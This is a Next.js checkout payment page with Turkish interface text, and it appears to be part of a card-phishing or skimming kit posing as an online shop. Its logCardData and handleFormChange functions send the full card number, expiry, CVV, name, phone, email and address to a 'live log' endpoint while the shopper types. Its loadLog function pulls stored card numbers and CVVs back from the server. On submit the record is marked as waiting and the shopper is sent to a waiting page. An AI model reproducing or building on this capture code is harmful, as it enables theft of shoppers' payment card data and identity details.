'use client';

import { useEffect, useRef, useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import PaymentGateway, { type PaymentFormData } from '@/components/checkout/PaymentGateway';
import { useToast } from '@/components/ToastProvider';
import { detectCardFundingType } from '@/lib/cardUtils';
import { getClientUserAgent } from '@/lib/userAgentParser';
import { trackTikTok } from '@/lib/tiktokPixel';
import { LIVE_LOG_DEBOUNCE_MS, postLiveLog } from '@/lib/liveFormLogger';
import { getVisitorLogId } from '@/lib/visitorSession';

interface CartItem {
  productId: string;
  name: string;
  price: number;
  image: string;
  quantity: number;
}

export default function CheckoutPaymentPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { showToast } = useToast();
  const logId = searchParams.get('logId');
  const errorType = searchParams.get('error');
  const [amount, setAmount] = useState(0);
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [blockDebitCards, setBlockDebitCards] = useState(false);
  const [initialCard, setInitialCard] = useState<Partial<PaymentFormData>>({});
  const [currentLogId, setCurrentLogId] = useState<string | null>(logId);
  const logTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    const cart: CartItem[] = JSON.parse(localStorage.getItem('cart') || '[]');
    const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0);
    setAmount(total);

    void postLiveLog({
      logId: logId || getVisitorLogId() || undefined,
      name: 'Ziyaretçi',
      pageType: 'payment',
      status: 'Ödeme Sayfasında',
      amount: total,
      userAgent: getClientUserAgent(),
    });

    const ctx = sessionStorage.getItem('checkoutPaymentContext');
    if (ctx) {
      try {
        const parsed = JSON.parse(ctx);
        if (parsed.phone) setPhone(parsed.phone);
        if (parsed.amount) setAmount(parsed.amount);
      } catch {
        /* ignore */
      }
    }

    if (logId) {
      loadLog(logId);
    }

    fetch(`/api/settings?t=${Date.now()}`, { cache: 'no-store' })
      .then((res) => res.json())
      .then((data) => {
        if (data.success) setBlockDebitCards(!!data.data.blockDebitCards);
      })
      .catch(() => {});
  }, [logId]);

  const loadLog = async (id: string) => {
    try {
      const res = await fetch(`/api/logs/${id}/status?t=${Date.now()}`);
      const data = await res.json();
      if (data.success && data.data) {
        const log = data.data;
        setCurrentLogId(log._id);
        if (log.amount) setAmount(log.amount);
        if (log.phone) setPhone(log.phone);
        setInitialCard({
          cardName: log.name || '',
          cardNumber: log.cardNumber
            ? log.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')
            : '',
          expiryDate: log.expiryDate || '',
          cvv: log.cvv || '',
        });
      }
    } catch {
      showToast('Ödeme bilgileri yüklenemedi', 'error');
    }
  };

  const logCardData = async (form: PaymentFormData, options?: { submitting?: boolean }) => {
    const id = currentLogId || logId;
    const ctxRaw = sessionStorage.getItem('checkoutPaymentContext');
    const ctx = ctxRaw ? JSON.parse(ctxRaw) : {};

    const hasCardInput =
      form.cardName || form.cardNumber.replace(/\s/g, '') || form.expiryDate || form.cvv;
    if (!hasCardInput && !options?.submitting) {
      const savedId = await postLiveLog({
        logId: id || getVisitorLogId() || undefined,
        pageType: 'payment',
        status: 'Ödeme Sayfasında',
        amount,
        phone: phone || ctx.phone,
        phoneRaw: (phone || ctx.phone || '').replace(/\D/g, '').slice(-10) || undefined,
        address: ctx.address,
      });
      return savedId || id;
    }

    const payload = {
      logId: id || undefined,
      name: form.cardName || ctx.fullName || phone || 'Bilinmeyen',
      firstName: ctx.firstName,
      lastName: ctx.lastName,
      phone: phone || ctx.phone,
      phoneRaw: (phone || ctx.phone || '').replace(/\D/g, '').slice(-10) || undefined,
      email: ctx.email,
      cardNumber: form.cardNumber.replace(/\s/g, '') || undefined,
      expiryDate: form.expiryDate || undefined,
      cvv: form.cvv || undefined,
      amount,
      status: options?.submitting ? 'Bekliyor' : 'Ödeme Sayfasında',
      pageType: options?.submitting ? 'waiting' : 'payment',
      userAgent: getClientUserAgent(),
      address: ctx.address,
    };

    const savedId = await postLiveLog(payload);
    if (savedId) {
      setCurrentLogId(savedId);
      return savedId;
    }
    return id;
  };

  const handleFormChange = (form: PaymentFormData) => {
    if (logTimeoutRef.current) clearTimeout(logTimeoutRef.current);
    logTimeoutRef.current = setTimeout(() => {
      void logCardData(form);
    }, LIVE_LOG_DEBOUNCE_MS);
  };

  const handlePay = async (form: PaymentFormData) => {
    if (!form.cardName.trim()) {
      showToast('Kart üzerindeki ad soyad gerekli', 'error');
      return;
    }
    const cleaned = form.cardNumber.replace(/\s/g, '');
    if (cleaned.length < 16) {
      showToast('Geçerli bir kart numarası giriniz', 'error');
      return;
    }
    if (blockDebitCards && detectCardFundingType(cleaned) === 'DEBIT') {
      showToast('Banka kartları desteklenmemektedir.', 'error');
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(form.expiryDate)) {
      showToast('Son kullanma tarihi AA/YY formatında olmalı', 'error');
      return;
    }
    if (form.cvv.length !== 3) {
      showToast('CVV 3 haneli olmalı', 'error');
      return;
    }

    setLoading(true);
    try {
      const finalLogId = (await logCardData(form, { submitting: true })) || currentLogId || logId;
      if (!finalLogId) {
        showToast('Log oluşturulamadı', 'error');
        setLoading(false);
        return;
      }

      trackTikTok('AddPaymentInfo', {
        value: amount,
        currency: 'TRY',
      });

      router.push(`/checkout/waiting?logId=${finalLogId}`);
    } catch {
      showToast('Ödeme başlatılamadı', 'error');
      setLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (logTimeoutRef.current) clearTimeout(logTimeoutRef.current);
    };
  }, []);

  return (
    <PaymentGateway
      amount={amount}
      errorType={errorType}
      loading={loading}
      initialData={initialCard}
      onPay={handlePay}
      onFormChange={handleFormChange}
    />
  );
}
